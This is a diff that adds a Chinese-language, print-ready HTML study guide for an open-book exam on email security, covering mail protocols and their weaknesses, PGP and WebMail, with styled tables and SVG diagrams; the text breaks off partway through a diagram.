@@ -1,0 +1,1831 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>第十章 电子邮件安全 · 开卷打印版</title>
+<style>
+/* ==========================================================================
+   第十章 电子邮件安全 —— 开卷考试打印版
+   设计取舍：本页专为 A4 打印设计，屏幕上就是纸面预览（所见即所打）。
+   刻意只做单一浅色外观、零 JS、零折叠——纸上没有"展开"这个动作。
+   ========================================================================== */
+:root{
+  --ink:#1a1a1a; --ink2:#3d3d3d; --mut:#6d6d6d;
+  --line:#c8c8c8; --line2:#e4e4e4; --line3:#f0f0f0;
+  --bg:#ffffff; --soft:#f6f7f8; --soft2:#eeeff1;
+  --acc:#14508c; --acc-bg:#eaf1f8; --acc-ln:#a8c4de;
+  --warn:#9d2f1c; --warn-bg:#fcf0ed; --warn-ln:#e0b3a8;
+  --ok:#1d6440; --ok-bg:#edf5f0; --ok-ln:#a9cbb8;
+  --gold:#7a5a10; --gold-bg:#faf5e6; --gold-ln:#ddc98a;
+}
+*{box-sizing:border-box}
+html{ -webkit-text-size-adjust:100%; }
+body{
+  margin:0; background:#dcdde0; color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Helvetica Neue",Arial,"Noto Sans CJK SC",sans-serif;
+  font-size:13.6px; line-height:1.42; color-scheme:light;
+}
+.page{
+  background:var(--bg); max-width:210mm; margin:0 auto; padding:11mm 10mm 14mm;
+  box-shadow:0 0 0 1px #c4c5c8;
+}
+
+/* ---------- 标题 ---------- */
+h1{ font-size:1.62em; line-height:1.2; margin:0 0 .1em; letter-spacing:-.01em; }
+h2{
+  font-size:1.24em; margin:1.0em 0 .4em; padding:.2em 0 .2em .55em;
+  border-left:5px solid var(--acc); background:linear-gradient(90deg,var(--acc-bg),transparent 70%);
+  break-after:avoid; page-break-after:avoid;
+}
+h2 .n{ color:var(--acc); font-weight:800; margin-right:.4em; }
+h3{
+  font-size:1.05em; margin:.75em 0 .28em; padding-bottom:.1em;
+  border-bottom:1.5px solid var(--line2);
+  break-after:avoid; page-break-after:avoid;
+}
+h4{ font-size:1.0em; margin:.55em 0 .2em; color:var(--ink2); break-after:avoid; page-break-after:avoid; }
+p{ margin:.28em 0; }
+b,strong{ font-weight:700; }
+ul,ol{ margin:.25em 0; padding-left:1.35em; }
+li{ margin:.06em 0; }
+li::marker{ color:var(--mut); }
+code{
+  font-family:"SF Mono",Menlo,Consolas,monospace; font-size:.88em;
+  background:var(--soft2); padding:.06em .3em; border-radius:3px;
+  overflow-wrap:anywhere;
+}
+hr{ border:0; border-top:1px solid var(--line2); margin:.8em 0; }
+a{ color:var(--acc); }
+
+/* ---------- 来源徽标（双轨） ---------- */
+.pref,.bref{
+  display:inline-block; font-size:.72em; font-weight:700; line-height:1.5;
+  padding:0 .38em; border-radius:3px; vertical-align:.08em; white-space:nowrap;
+  text-transform:none; letter-spacing:0; margin:0 .12em;
+}
+.pref{ color:#0e3d6e; background:var(--acc-bg); border:1px solid var(--acc-ln); }
+.bref{ color:#4b4b4b; background:var(--soft2); border:1px solid var(--line); }
+
+/* ---------- 通用盒子 ---------- */
+.box{
+  border:1px solid var(--line); border-radius:4px; padding:.34em .5em;
+  margin:.4em 0; background:var(--soft); break-inside:avoid; page-break-inside:avoid;
+}
+.box-t{ font-weight:800; font-size:.95em; margin-bottom:.12em; text-transform:none; }
+.box.key{ background:var(--acc-bg); border-color:var(--acc-ln); }
+.box.key .box-t{ color:#0e3d6e; }
+.box.trap{ background:var(--warn-bg); border-color:var(--warn-ln); }
+.box.trap .box-t{ color:var(--warn); }
+.box.good{ background:var(--ok-bg); border-color:var(--ok-ln); }
+.box.good .box-t{ color:var(--ok); }
+.box.exam{ background:var(--gold-bg); border-color:var(--gold-ln); }
+.box.exam .box-t{ color:var(--gold); }
+.box.beyond{ background:#fafafa; border-color:var(--line2); border-style:dashed; color:#5a5a5a; }
+.box.beyond .box-t{ color:#6d6d6d; }
+.box p:first-of-type{ margin-top:0 } .box p:last-child{ margin-bottom:0 }
+
+/* ---------- 场景卡（PPT 先抛问题） ---------- */
+.scene{
+  border:1px solid var(--acc-ln); border-left:5px solid var(--acc); border-radius:5px;
+  background:var(--acc-bg); padding:.36em .55em; margin:.45em 0;
+  break-inside:avoid; page-break-inside:avoid;
+}
+.scene-k{ font-size:.74em; font-weight:800; color:#0e3d6e; letter-spacing:.04em; text-transform:none; }
+.scene-q{ font-size:1.05em; font-weight:700; margin:.08em 0 .18em; }
+.scene-b{ font-size:.95em; color:var(--ink2); }
+.scene-b p{ margin:.16em 0 }
+
+/* ---------- 因果链 ---------- */
+.chain{ display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:.4em; margin:.45em 0;
+        break-inside:avoid; page-break-inside:avoid; }
+.chain-i{ border:1px solid var(--line); border-radius:4px; padding:.3em .45em; background:#fff; }
+.chain-i.prev{ background:var(--soft); }
+.chain-i.now{ background:var(--acc-bg); border-color:var(--acc-ln); }
+.chain-i.next{ background:var(--warn-bg); border-color:var(--warn-ln); }
+.chain-k{ font-size:.72em; font-weight:800; letter-spacing:.05em; color:var(--mut); margin-bottom:.1em; }
+.chain-i.now .chain-k{ color:#0e3d6e } .chain-i.next .chain-k{ color:var(--warn) }
+.chain-b{ font-size:.88em; line-height:1.38; }
+
+/* ---------- 表格 ---------- */
+table{ border-collapse:collapse; width:100%; margin:.35em 0; font-size:.88em;
+       break-inside:avoid; page-break-inside:avoid; }
+th,td{ border:1px solid var(--line); padding:.18em .32em; vertical-align:top; text-align:left; }
+th{ background:var(--soft2); font-weight:700; }
+tbody tr:nth-child(even){ background:#fbfbfc; }
+td.c,th.c{ text-align:center; }
+.tw{ overflow-x:auto; }
+table.tight{ font-size:.84em } table.tight th, table.tight td{ padding:.14em .26em }
+
+/* ---------- 步骤表 ---------- */
+.steps{ counter-reset:st; margin:.35em 0; }
+.step{
+  display:grid; grid-template-columns:1.45em minmax(0,1fr); gap:0 .4em;
+  border-bottom:1px solid var(--line3); padding:.14em .1em .14em 0; margin:0;
+  break-inside:avoid; page-break-inside:avoid;
+}
+.step::before{
+  counter-increment:st; content:counter(st);
+  grid-row:1/span 2; align-self:start; margin-top:.12em;
+  display:flex; align-items:center; justify-content:center;
+  width:1.45em; height:1.45em; border-radius:50%;
+  background:var(--acc); color:#fff; font-size:.74em; font-weight:800;
+}
+.step .sb{ font-size:.93em; }
+.step .sw{ font-size:.85em; color:var(--ink2); border-left:2px solid var(--acc-ln);
+           padding:0 0 0 .38em; margin:.05em 0 0; }
+.step .sw b{ color:var(--acc); }
+
+/* ---------- 定义列表 ---------- */
+.kv{ display:grid; grid-template-columns:max-content minmax(0,1fr); gap:.1em .55em;
+     margin:.3em 0; font-size:.93em; }
+.kv dt{ font-weight:700; color:var(--acc); }
+.kv dd{ margin:0; }
+
+/* ---------- 权重条 ---------- */
+.wrow{ display:grid; grid-template-columns:minmax(0,7.5em) minmax(0,1fr) auto; gap:.5em;
+       align-items:center; margin:.1em 0; font-size:.86em; }
+.wtrack{ background:var(--line3); border-radius:3px; height:.85em; overflow:hidden; }
+.wfill{ display:block; height:100%; background:var(--acc); border-radius:3px; }
+.wfill.b{ background:#7a9cc0 } .wfill.c{ background:#9fb6cd }
+.wnum{ font-size:.86em; color:var(--mut); white-space:nowrap; }
+
+/* ---------- 习题 ---------- */
+.q{ border:1px solid var(--line2); border-radius:4px; padding:.28em .45em; margin:.22em 0;
+    break-inside:avoid; page-break-inside:avoid; }
+.q .qt{ font-weight:600; }
+.q .qt .qn{ display:inline-block; min-width:1.5em; font-weight:800; color:var(--acc); }
+.q .opts{ font-size:.9em; color:var(--ink2); margin:.08em 0 .1em; }
+.q .ans{ font-size:.92em; background:var(--ok-bg); border-left:3px solid var(--ok);
+         padding:.14em .4em; border-radius:0 3px 3px 0; margin-top:.12em; }
+.q .ans b:first-child{ color:var(--ok); }
+.q.big{ background:#fdfdfe; }
+.q.big .ans{ background:var(--gold-bg); border-left-color:var(--gold); }
+.q.big .ans b:first-child{ color:var(--gold); }
+
+.qcols{ columns:2; column-gap:.7em; }
+.qcols .q{ break-inside:avoid; page-break-inside:avoid; margin:0 0 .3em; }
+
+/* ---------- SVG ---------- */
+figure{ margin:.45em 0; break-inside:avoid; page-break-inside:avoid; }
+figure svg{ display:block; width:100%; height:auto; max-width:100%; }
+figcaption{ font-size:.8em; color:var(--mut); text-align:center; margin-top:.1em; }
+svg text{ font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif; }
+
+/* ---------- 两栏 ---------- */
+.two{ display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:.5em; }
+.three{ display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:.45em; }
+
+/* ---------- 速查卡 ---------- */
+.cheat{ border:1.5px solid var(--ink); border-radius:5px; padding:.34em .5em; margin:.35em 0;
+        break-inside:avoid; page-break-inside:avoid; }
+.cheat h4{ margin:.05em 0 .15em; color:var(--acc); font-size:.97em; }
+.cheat ul{ padding-left:1.1em; font-size:.87em; }
+.mark{ background:#fff3b0; padding:0 .15em; border-radius:2px; }
+
+.lead{ font-size:1.02em; color:var(--ink2); }
+.small{ font-size:.86em; color:var(--mut); }
+.nowrap{ white-space:nowrap }
+
+/* ---------- 目录 ---------- */
+.toc{ border:1px solid var(--line); border-radius:5px; padding:.5em .8em; background:var(--soft);
+      font-size:.92em; break-inside:avoid; }
+.toc ol{ margin:.2em 0; padding-left:1.4em; }
+.toc a{ text-decoration:none; color:var(--ink); }
+
+/* ==========================================================================
+   打印
+   ========================================================================== */
+@page{ size:A4; margin:11mm 10mm; }
+@media print{
+  body{ background:#fff; font-size:9pt; line-height:1.42; }
+  .page{ box-shadow:none; max-width:none; margin:0; padding:0; }
+  h2{ font-size:11.2pt; margin:.9em 0 .35em; }
+  h3{ font-size:9.6pt; margin:.7em 0 .25em; }
+  h4{ font-size:9.1pt; }
+  .noprint{ display:none !important; }
+  .pagebreak{ break-before:page; page-break-before:always; }
+  .avoid,figure,table,.box,.q,.step,.scene,.chain,.cheat{
+    break-inside:avoid; page-break-inside:avoid;
+  }
+  a{ color:var(--ink); text-decoration:none; }
+  /* 彩色底纹在黑白打印机上仍要能分辨 —— 全部保留边框 */
+  *{ -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+<div class="page">
+<h1>第十章 电子邮件安全</h1>
+<p class="lead" style="margin:0 0 .5em">开卷考试打印版 · 以老师 PPT（41 页）定脉络与重点，课本（第 2 版 pp.306–329）作详解</p>
+
+<div class="box key">
+  <div class="box-t">这份资料怎么用</div>
+  <p><b>考前</b>：按 §0 → §4 顺序读一遍，重点是每节开头的「解决什么问题」。<br>
+  <b>考场</b>：先翻最后一页的<b>速查卡</b>定位考点，再回正文看详解。全文的
+  <span class="pref">PPT p.15</span> 徽标表示这句来自老师 PPT（＝考纲），
+  <span class="bref">课本 p.312</span> 徽标表示来自课本（＝详解，可直接抄）。</p>
+</div>
+
+<h2><span class="n">§0</span>先看全局：这一章到底在解决什么</h2>
+
+<div class="scene">
+  <div class="scene-k">全章唯一的病根</div>
+  <p class="scene-q">邮件这套协议，是在一个"网上没有坏人"的年代设计的。</p>
+  <div class="scene-b">
+    <p>SMTP／POP3／IMAP 诞生时只考虑了一件事：<b>把信送到</b>。于是留下三个致命的空白——<br>
+    ① 邮件<b>全程明文</b>（线上明文传、服务器上也明文存）；② 发信<b>不验证身份</b>（谁都能冒名发）；
+    ③ 没有<b>完整性</b>和<b>抗抵赖</b>机制（改了看不出、发了能赖掉）。</p>
+    <p>本章的四个小节，就是四批人从四个不同位置来补这三个洞。<b>把"谁补哪一段"想清楚，这一章就通了。</b></p>
+  </div>
+</div>
+
+<h3>全章因果链：每一节都在补上一节的漏</h3>
+
+<figure>
+<svg viewBox="0 0 760 268" role="img" aria-label="全章因果链示意图">
+  <defs>
+    <marker id="ar" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+      <path d="M0,0 L8,4 L0,8 z" fill="#14508c"/>
+    </marker>
+  </defs>
+  <!-- 病根 -->
+  <rect x="8" y="8" width="744" height="40" rx="5" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="380" y="26" font-size="13" font-weight="700" fill="#9d2f1c" text-anchor="middle">病根：邮件协议明文传输 · 发信不认证 · 无完整性与抗抵赖</text>
+  <text x="380" y="42" font-size="11.5" fill="#7a3527" text-anchor="middle">→ 窃听 · 垃圾邮件 · 邮件炸弹 · 恶意代码（钓鱼）· 电子邮件欺骗（§1 五类安全问题）</text>
+  <line x1="380" y1="48" x2="380" y2="66" stroke="#14508c" stroke-width="1.6" marker-end="url(#ar)"/>
+  <text x="392" y="62" font-size="11" fill="#6d6d6d">要满足四项安全需求：机密性 · 完整性 · 不可否认性 · 真实性</text>
+
+  <!-- 四条补法 -->
+  <rect x="8" y="72" width="182" height="86" rx="5" fill="#eaf1f8" stroke="#14508c" stroke-width="1.6"/>
+  <text x="99" y="90" font-size="12" font-weight="700" fill="#0e3d6e" text-anchor="middle">① 端到端安全邮件</text>
+  <text x="99" y="107" font-size="11" fill="#25415c" text-anchor="middle">PEM / S/MIME / PGP</text>
+  <text x="99" y="123" font-size="10.5" fill="#4a5c6e" text-anchor="middle">在正文这一层自己加解密</text>
+  <text x="99" y="137" font-size="10.5" fill="#4a5c6e" text-anchor="middle">不用改邮件服务器</text>
+  <text x="99" y="152" font-size="11" font-weight="700" fill="#9d2f1c" text-anchor="middle">＝ §2（PPT 占 56%）</text>
+
+  <rect x="198" y="72" width="182" height="86" rx="5" fill="#f6f7f8" stroke="#c8c8c8"/>
+  <text x="289" y="90" font-size="12" font-weight="700" text-anchor="middle">② 传输安全增强</text>
+  <text x="289" y="107" font-size="11" fill="#3d3d3d" text-anchor="middle">IPsec（网络层）</text>
+  <text x="289" y="123" font-size="11" fill="#3d3d3d" text-anchor="middle">SSL / TLS（传输层）</text>
+  <text x="289" y="141" font-size="10.5" fill="#9d2f1c" text-anchor="middle">只保护"线上"这一段，</text>
+  <text x="289" y="154" font-size="10.5" fill="#9d2f1c" text-anchor="middle">服务器上仍是明文</text>
+
+  <rect x="388" y="72" width="182" height="86" rx="5" fill="#f6f7f8" stroke="#c8c8c8"/>
+  <text x="479" y="90" font-size="12" font-weight="700" text-anchor="middle">③ 邮件服务器增强</text>
+  <text x="479" y="107" font-size="11" fill="#3d3d3d" text-anchor="middle">防火墙 · 入侵检测</text>
+  <text x="479" y="123" font-size="11" fill="#3d3d3d" text-anchor="middle">反垃圾 · 恶意代码检测</text>
+  <text x="479" y="145" font-size="11" font-weight="700" fill="#9d2f1c" text-anchor="middle">＝ §4 垃圾邮件防范</text>
+
+  <rect x="578" y="72" width="174" height="86" rx="5" fill="#fafafa" stroke="#e4e4e4" stroke-dasharray="4 3"/>
+  <text x="665" y="90" font-size="12" font-weight="700" fill="#6d6d6d" text-anchor="middle">④ 发送方身份验证</text>
+  <text x="665" y="107" font-size="11" fill="#6d6d6d" text-anchor="middle">SPF · DKIM · DMARC</text>
+  <text x="665" y="123" font-size="11" fill="#6d6d6d" text-anchor="middle">DANE</text>
+  <text x="665" y="145" font-size="10.5" fill="#8a8a8a" text-anchor="middle">PPT 未讲 · 课本也只列名</text>
+
+  <!-- WebMail 分支 -->
+  <line x1="380" y1="158" x2="380" y2="186" stroke="#14508c" stroke-width="1.6" marker-end="url(#ar)"/>
+  <rect x="120" y="192" width="520" height="66" rx="5" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="380" y="212" font-size="12.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">新变量：用浏览器收发邮件（WebMail）＝ §3</text>
+  <text x="380" y="230" font-size="11" fill="#7a3527" text-anchor="middle">浏览器当了用户代理，于是第 9 章 Web 应用的洞被整套搬进邮箱：</text>
+  <text x="380" y="247" font-size="11" fill="#7a3527" text-anchor="middle">暴力破解 · 恶意 HTML 邮件（XSS/脚本）· Cookie 会话攻击</text>
+</svg>
+<figcaption>全章因果链 —— 一个病根，四种补法，外加 WebMail 这个新变量</figcaption>
+</figure>
+
+<h3>老师的 PPT 把篇幅给了谁（这决定本资料的篇幅分配）</h3>
+
+<p class="small">PPT 共 41 页，去掉封面 1 页和重复的内容提纲 4 页，正文 36 页。<b>PGP 一家占了 56%，超过其余三节之和。</b></p>
+
+<div class="wrow"><span>§1 安全问题</span><span class="wtrack"><span class="wfill c" style="width:11%"></span></span><span class="wnum">4 页 · 11%</span></div>
+<div class="wrow"><span>§2 PGP</span><span class="wtrack"><span class="wfill" style="width:100%"></span></span><span class="wnum">20 页 · 56%</span></div>
+<div class="wrow"><span>§3 WebMail</span><span class="wtrack"><span class="wfill b" style="width:40%"></span></span><span class="wnum">8 页 · 22%</span></div>
+<div class="wrow"><span>§4 垃圾邮件</span><span class="wtrack"><span class="wfill c" style="width:11%"></span></span><span class="wnum">4 页 · 11%</span></div>
+
+<h3>PPT 与课本的双向对照（哪些必看、哪些可以不看）</h3>
+
+<table class="tight">
+<thead><tr><th style="width:23%">PPT</th><th style="width:25%">课本</th><th>关系与本资料的处理</th></tr></thead>
+<tbody>
+<tr><td>p.3–4</td><td>10.1 概述、表 10-1</td><td>两边都有 → 正文，重绘邮件系统结构图</td></tr>
+<tr><td>p.5</td><td>10.2 五类安全问题</td><td>两边都有 → 正文</td></tr>
+<tr><td>p.6（只列 3 条措施）</td><td>10.2（列了 4 条）</td><td><b>课本多第 4 条</b>「发送方身份验证 SPF/DKIM/DMARC/DANE」→ 灰底说明，不作要求</td></tr>
+<tr><td>p.8–12</td><td>10.3 引言</td><td>PEM / S/MIME / PGP 三者对照 → 正文</td></tr>
+<tr><td>p.13–14</td><td>表 10-2、图 10-3</td><td>两边都有 → 正文核心</td></tr>
+<tr><td><b>p.15–23（9 页流程图）</b></td><td><b>课本没有</b></td><td><b>PPT 有、课本没有 → 老师专门加的，必考</b>。这 9 页把 PGP 拆成了逐步流程，本资料照此重绘</td></tr>
+<tr><td><b>p.24–26（3 道讨论题）</b></td><td>答案散在 p.312–313</td><td><b>老师提问但没给答案</b> → 单独逐题作答，见 §2.6</td></tr>
+<tr><td>p.27</td><td>图 10-4 消息格式</td><td>两边都有 → 正文，重绘</td></tr>
+<tr><td class="c" style="color:#9d2f1c">（一个字都没提）</td><td><b>10.3.2 PGP 密钥管理</b></td><td><b>课本有、PPT 没有 → 仍然写进正文</b>，理由见下方说明</td></tr>
+<tr><td>p.29–36</td><td>10.4 WebMail</td><td>两边都有 → 正文</td></tr>
+<tr><td>p.38–41</td><td>10.5 垃圾邮件</td><td>两边都有 → 正文</td></tr>
+</tbody>
+</table>
+
+<div class="box trap">
+  <div class="box-t">⚠ 关于「PGP 密钥管理」这一节的篇幅，说明一下</div>
+  <p>本资料其它各节都严格按 PPT 的详略分配篇幅。<b>唯独 §2.8「PGP 密钥管理」例外</b>：老师的 PPT
+  <b>一页都没讲</b>，但课本 10.3.2 用了整整 3 页，而且<b>课本习题在这里考了 6 道</b>
+  （单选 7、11、12，简答 3、4、5）。</p>
+  <p><b>结论：这是「老师留给课本讲」的部分，不是「不考」的部分。</b>照写不误。</p>
+</div>
+
+<div class="box exam">
+  <div class="box-t">★ 老师提了问、却没给答案的 3 道讨论题（开卷考试最爱出这一类）</div>
+  <ol style="margin:.25em 0">
+  <li><span class="pref">p.24</span> <b>签名、加密、压缩的顺序问题</b> → <b class="mark">先签名 → 再压缩 → 最后加密</b>（两组各两条理由，见 §2.6）</li>
+  <li><span class="pref">p.25</span> <b>为什么要 Base64 编码？对性能的影响？</b> → 密文是二进制而很多邮件系统只收 ASCII；代价是<b>膨胀 33%</b>，但因加密前已压缩，实际影响小得多</li>
+  <li><span class="pref">p.26</span> <b>为什么要分段？会话密钥和签名在第几段？</b> → 邮件系统限最大报文长（约 50 000 字节）；<b>分段在所有处理之后才做</b>，所以两者<b>只出现在第 1 段的开头</b></li>
+  </ol>
+  <p class="small" style="margin-top:.2em">这 3 道全都能在课本 p.312–313 找到依据，而且课本习题也在考（单选 4、简答 2、简答 12）。<b>老师提了不答，基本等于点题。</b></p>
+</div>
+<h2><span class="n">§1</span>电子邮件安全问题 <span class="pref">PPT p.3–6</span> <span class="bref">课本 10.1–10.2</span></h2>
+
+<div class="chain">
+  <div class="chain-i prev"><div class="chain-k">承上</div><div class="chain-b">邮件是最老的互联网应用之一，当年只求「送到」。</div></div>
+  <div class="chain-i now"><div class="chain-k">本节</div><div class="chain-b">先看清邮件系统<b>由哪几块拼成、走哪几个协议</b>，才知道洞在哪一块。</div></div>
+  <div class="chain-i next"><div class="chain-k">留下的坑</div><div class="chain-b">洞在<b>协议本身</b>，改协议动静太大 → 只能在正文这一层自己补 → §2 PGP</div></div>
+</div>
+
+<h3>1.1 邮件系统的三大组成部件 <span class="bref">课本 p.306</span></h3>
+
+<p>课本第一句话就是考点：一个典型的电子邮件系统有<b>三个主要组成部件</b> ——</p>
+
+<dl class="kv">
+<dt>① 用户代理 UA</dt><dd>User Agent，<b>用户与邮件系统的接口</b>。Outlook Express、Foxmail、手机邮件 App 都是。至少要能做三件事：<b>显示、撰写、处理</b>（发送/接收/阅后删除/存盘/打印/转发/分类保存）。</dd>
+<dt>② 邮件服务器</dt><dd>邮件系统的<b>核心构件</b>。按客户/服务器方式工作，负责收发邮件并向发信人报告传送情况（已交付／被拒绝／丢失）。其中负责发送的部件叫<b>邮件传输代理 MTA</b>（Mail Transfer Agent）。</dd>
+<dt>③ 邮件使用的协议</dt><dd>发送用 <b>SMTP</b>，接收用 <b>POP3</b> 或 <b>IMAP</b>。<b>发和收是两个不同的协议</b> —— 这一点必须记牢。</dd>
+</dl>
+
+<div class="box key">
+  <div class="box-t">为什么"发"和"收"要用两个协议？</div>
+  <p>因为它们干的是两件不同的事。<b>SMTP 是"推"</b>：把邮件从你这里推到对方服务器，是服务器之间的接力，<b>推完就结束</b>。
+  <b>POP3/IMAP 是"拉"</b>：你的邮件早就躺在自己服务器的邮箱里了，你要做的是<b>去把它取回来</b>。
+  推和拉的方向相反、时机不同（收信人可能一个月后才上线），所以不可能用同一个协议。</p>
+</div>
+
+<h4>三个协议的对照（表格里的数字是选择题的常客）</h4>
+
+<table>
+<thead><tr><th style="width:12%">协议</th><th style="width:11%">作用</th><th class="c" style="width:14%">默认 TCP 端口</th><th>关键特性</th></tr></thead>
+<tbody>
+<tr><td><b>SMTP</b><br><span class="small">Simple Mail<br>Transfer Protocol</span></td><td>发送邮件</td><td class="c"><b>25</b></td><td>高效、可靠。<b>最初只支持纯 ASCII 文本</b>，后来有了 <b>MIME</b>（多用途互联网邮件扩展，RFC 2045–2049）对二进制文件编码，才能传各种类型的信息。<br><span class="small">同一台邮件服务器<b>身份会变</b>：向别的服务器发信时它是 <b>SMTP 客户</b>，从别的服务器收信时它是 <b>SMTP 服务器</b>。</span></td></tr>
+<tr><td><b>POP3</b><br><span class="small">Post Office<br>Protocol v3</span></td><td>接收邮件</td><td class="c"><b>110</b></td><td>最初 1984 年 RFC 918，现常用第三版 RFC 1939。<b>脱机邮件处理协议</b>：允许客户端把邮件下载下来，但<b>你在客户端上的操作（移动邮件、标记已读）不会反馈到服务器</b>。<br><span class="small">课本例子：你用客户端收了 QQ 邮箱的 3 封信并移到别的文件夹，服务器上那 3 封<b>没有同步移动</b>。</span></td></tr>
+<tr><td><b>IMAP4</b><br><span class="small">Internet Mail<br>Access Protocol</span></td><td>接收邮件</td><td class="c"><b>143</b></td><td>RFC 2060 / 3501，<b>改进了 POP3 的不足</b>：可以浏览信头后再决定是否收取／删除／检索邮件的特定部分，可在服务器上建/改文件夹，支持多个邮箱。<br>除脱机模式外还支持<b>联机操作和断连接操作</b>；<b>脱机模式不会自动删除服务器上已取出的邮件</b>；联机/断连模式把服务器当成<b>「远程文件服务器」</b>访问。</td></tr>
+</tbody>
+</table>
+
+<div class="box exam">
+  <div class="box-t">★ 单选 1 就考这个：客户端的管理操作要同步到服务器，用哪个协议？</div>
+  <p>答案是 <b>IMAP</b>。判据只有一句话：<b>POP3 是脱机协议，客户端动作不回传服务器；IMAP 把服务器当远程文件服务器，动作会同步。</b>
+  记不住就记课本那个 QQ 邮箱的例子。<b>所有邮件服务器和用户代理都同时支持 POP3 和 IMAP</b>，所以"支持不支持"不是判据，"同不同步"才是。</p>
+</div>
+
+<h3>1.2 两种收发方式：用户代理 vs. WebMail <span class="pref">PPT p.3（图）</span> <span class="bref">课本图 10-1</span></h3>
+
+<p>这张图 PPT 和课本都给了，而且 <span class="pref">PPT p.30</span> 讲 WebMail 时又贴了一次。<b>看图只要抓一件事：哪一段用什么协议。</b></p>
+
+<figure>
+<svg viewBox="0 0 760 300" role="img" aria-label="用户代理与 WebMail 两种收发邮件方式对比">
+  <defs>
+    <marker id="a2" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#3d3d3d"/></marker>
+  </defs>
+  <!-- (a) -->
+  <text x="8" y="15" font-size="12" font-weight="700" fill="#0e3d6e">(a) 用户代理收发邮件（Outlook / Foxmail）</text>
+  <rect x="8" y="26" width="118" height="46" rx="4" fill="#f6f7f8" stroke="#c8c8c8"/>
+  <text x="67" y="44" font-size="11" text-anchor="middle">发送方用户代理</text>
+  <text x="67" y="60" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 客户</text>
+
+  <rect x="216" y="26" width="128" height="88" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="280" y="43" font-size="11" text-anchor="middle">发送方邮件服务器</text>
+  <text x="280" y="62" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 服务器</text>
+  <line x1="228" y1="72" x2="332" y2="72" stroke="#c8c8c8"/>
+  <text x="280" y="90" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 客户</text>
+  <text x="280" y="106" font-size="9.5" fill="#6d6d6d" text-anchor="middle">（转发时换个身份）</text>
+
+  <rect x="434" y="26" width="128" height="88" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="498" y="43" font-size="11" text-anchor="middle">接收方邮件服务器</text>
+  <text x="498" y="62" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 服务器</text>
+  <line x1="446" y1="72" x2="550" y2="72" stroke="#c8c8c8"/>
+  <text x="498" y="90" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">POP3/IMAP 服务器</text>
+
+  <rect x="652" y="26" width="100" height="46" rx="4" fill="#f6f7f8" stroke="#c8c8c8"/>
+  <text x="702" y="44" font-size="11" text-anchor="middle">接收方用户代理</text>
+  <text x="702" y="60" font-size="10.5" font-weight="700" fill="#14508c" text-anchor="middle">POP3/IMAP 客户</text>
+
+  <line x1="128" y1="49" x2="212" y2="49" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="170" y="42" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">SMTP</text>
+  <text x="170" y="63" font-size="9.5" fill="#6d6d6d" text-anchor="middle">发送邮件</text>
+
+  <line x1="346" y1="90" x2="430" y2="70" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="388" y="98" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">SMTP</text>
+
+  <line x1="564" y1="90" x2="648" y2="60" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="606" y="98" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">POP3/IMAP</text>
+  <text x="606" y="112" font-size="9.5" fill="#6d6d6d" text-anchor="middle">读取邮件</text>
+
+  <!-- (b) -->
+  <text x="8" y="163" font-size="12" font-weight="700" fill="#0e3d6e">(b) WebMail 收发邮件（浏览器）</text>
+  <rect x="8" y="174" width="118" height="46" rx="4" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="67" y="192" font-size="11" text-anchor="middle">发送方浏览器</text>
+  <text x="67" y="208" font-size="11" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS 客户</text>
+
+  <rect x="216" y="174" width="128" height="88" rx="4" fill="#fcf0ed" stroke="#9d2f1c"/>
+  <text x="280" y="191" font-size="11" text-anchor="middle">发送方邮件服务器</text>
+  <text x="280" y="210" font-size="11" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS 服务器</text>
+  <line x1="228" y1="220" x2="332" y2="220" stroke="#e0b3a8"/>
+  <text x="280" y="238" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 客户</text>
+
+  <rect x="434" y="174" width="128" height="88" rx="4" fill="#fcf0ed" stroke="#9d2f1c"/>
+  <text x="498" y="191" font-size="11" text-anchor="middle">接收方邮件服务器</text>
+  <text x="498" y="210" font-size="11" font-weight="700" fill="#14508c" text-anchor="middle">SMTP 服务器</text>
+  <line x1="446" y1="220" x2="550" y2="220" stroke="#e0b3a8"/>
+  <text x="498" y="238" font-size="11" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS 服务器</text>
+
+  <rect x="652" y="174" width="100" height="46" rx="4" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="702" y="192" font-size="11" text-anchor="middle">接收方浏览器</text>
+  <text x="702" y="208" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS 客户</text>
+
+  <line x1="128" y1="197" x2="212" y2="197" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="170" y="190" font-size="10" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS</text>
